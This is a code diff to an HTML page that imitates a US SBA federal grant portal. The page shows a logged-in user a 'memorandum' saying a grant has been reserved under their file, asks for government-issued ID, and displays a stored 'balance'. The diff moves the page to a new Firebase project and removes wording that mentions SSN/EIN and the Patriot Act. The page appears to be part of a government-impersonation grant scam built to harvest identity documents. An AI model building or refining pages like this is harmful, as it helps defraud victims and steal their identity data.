@@ -67,10 +67,10 @@
 
             <div class="allocation-letter">
                 <p style="font-size: 10px; color: #94a3b8; margin: 0; font-weight: 700;">MEMORANDUM FOR:</p>
-                <p id="userName" style="font-size: 14px; font-weight: 900; color: var(--sba-blue); margin: 5px 0 15px;">PROVISIONING IDENTITY...</p>
+                <p id="userName" style="font-size: 14px; font-weight: 900; color: var(--sba-blue); margin: 5px 0 15px;">AUTHENTICATING IDENTITY...</p>
                 
                 <p style="font-size: 11px; color: #475569; line-height: 1.5; margin-bottom: 10px;">
-                    This serves as formal notice that based on your 2026 registration profile, a federal grant allocation has been provisionally reserved under your SSN/EIN:
+                    This serves as formal notice that based on your 2026 registration profile, a federal grant allocation has been provisionally reserved under your file:
                 </p>
                 
                 <div style="background: #f8fafc; padding: 10px; border-radius: 6px; border-left: 4px solid var(--sba-blue);">
@@ -83,7 +83,7 @@
                 <div class="step-num">1</div>
                 <div>
                     <b style="font-size: 12px; color: var(--sba-blue);">IDENTITY VERIFICATION</b>
-                    <p style="font-size: 11px; color: #64748b; margin: 4px 0;">Satisfy Patriot Act compliance by providing valid government-issued identification.</p>
+                    <p style="font-size: 11px; color: #64748b; margin: 4px 0;">Satisfy compliance by providing valid government-issued identification.</p>
                 </div>
             </div>
 
@@ -109,13 +109,14 @@
         import { getAuth, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
         import { getFirestore, doc, getDoc } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";
 
+        // MATCHED CONFIG: Using sba-portal-2026-f1253
         const firebaseConfig = {
-            apiKey: "AIzaSyB5nOOx153po4nWh4irbmTAcxsCZaM1-9k",
-            authDomain: "sba-grant-2026.firebaseapp.com",
-            projectId: "sba-grant-2026",
-            storageBucket: "sba-grant-2026.firebasestorage.app",
-            messagingSenderId: "838430821326",
-            appId: "1:838430821326:web:6438deacb334076a64f99f"
+            apiKey: "AIzaSyCq8CgTyNbKVbUm_GItIC7FAvTuNrNspxI",
+            authDomain: "sba-portal-2026-f1253.firebaseapp.com",
+            projectId: "sba-portal-2026-f1253",
+            storageBucket: "sba-portal-2026-f1253.firebasestorage.app",
+            messagingSenderId: "363290267220",
+            appId: "1:363290267220:web:2a3e8601c11be5dd6e27c1"
         };
 
         const app = initializeApp(firebaseConfig);
@@ -128,7 +129,7 @@
                 return; 
             }
             
-            // SECURITY CHECK: If they haven't verified email, kick them back to verify page
+            // SECURITY: Only allow verified emails to see the letter
             if (!user.emailVerified) {
                 window.location.href = 'verify.html';
                 return;
@@ -138,10 +139,8 @@
                 const snap = await getDoc(doc(db, "users", user.uid));
                 if(snap.exists()) {
                     const data = snap.data();
-                    // Formal name formatting
                     document.getElementById('userName').innerText = (data.fullName || "VALUED CITIZEN").toUpperCase();
                     
-                    // Number formatting for the balance
                     const rawBal = data.balance || 0;
                     const balance = typeof rawBal === 'string' ? parseFloat(rawBal.replace(/,/g, '')) : parseFloat(rawBal);
                     
